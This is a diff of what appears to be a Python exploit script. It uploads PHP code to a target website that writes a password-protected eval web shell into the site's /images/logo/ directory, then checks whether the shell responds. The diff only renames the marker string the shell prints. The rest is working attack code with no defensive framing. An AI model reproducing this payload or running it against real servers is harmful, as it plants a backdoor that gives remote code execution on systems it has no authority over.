@@ -22,7 +22,7 @@ def check_shell(target,ShellName):
     url = target + "/images/logo/" + ShellName + ".php"
     try:
         r = requests.get(url,headers=headers,proxies=proxies,verify=False,timeout=30)
-        if r.status_code == 200 and "Jun_sheng" in r.text:
+        if r.status_code == 200 and "Success" in r.text:
             return True
         else:
             print("[-] %s 利用失败" % target)
@@ -81,7 +81,7 @@ def main():
     ShellPass = random_str()
     ShellTemp = io.StringIO()
     # test_poc = "<?php phpinfo();?>"
-    poc = "<?php $myfile = fopen(\"" + ShellName + ".php\", \"w\");$txt = 'Jun_sheng<?php @eval($_POST[\"" + ShellPass + "\"]);?>';fwrite($myfile, $txt);fclose($myfile);?>"
+    poc = "<?php $myfile = fopen(\"" + ShellName + ".php\", \"w\");$txt = 'Success<?php @eval($_POST[\"" + ShellPass + "\"]);?>';fwrite($myfile, $txt);fclose($myfile);?>"
     ShellTemp.write(poc)
 
     file = {
